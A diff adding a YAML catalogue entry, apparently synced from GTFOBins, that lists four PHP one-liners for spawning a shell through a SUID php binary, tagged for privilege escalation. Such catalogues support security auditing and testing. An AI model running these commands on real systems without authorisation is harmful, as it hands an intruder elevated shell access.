@@ -1,0 +1,28 @@
+id: gtfobins/php/shell/suid
+type: binary
+platform: linux
+name: php
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: php -r 'system("/bin/sh -i");'
+- template: php -r 'passthru("/bin/sh -i");'
+- template: php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h);
+    }'
+- template: php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+references:
+- https://gtfobins.github.io/gtfobins/php/
+tags:
+- linux
+- unix
+- gtfobins
